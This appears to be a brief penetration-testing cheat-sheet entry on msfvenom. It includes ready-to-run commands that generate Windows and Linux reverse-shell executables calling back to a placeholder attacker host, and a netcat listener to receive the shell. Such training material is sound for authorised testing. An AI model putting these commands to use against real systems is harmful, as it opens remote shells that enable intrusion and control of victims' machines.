## msfvenom: choose the operation and read the result

Generate a payload matching the target and listener.

### What the result establishes

Match payload platform, architecture, staged/stageless choice, output format and handler configuration.

### Prerequisites and common failures

LHOST must be reachable from the target. Producing a file does not prove it runs on the target or matches the receiving handler.

### Example 1: Commands

Run in: **Kali**. These are raw stageless shells: listen on Kali with sudo nc -lvnp 443. Meterpreter payloads need a matching Metasploit handler instead.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f exe -o shell.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f elf -o shell.elf
```
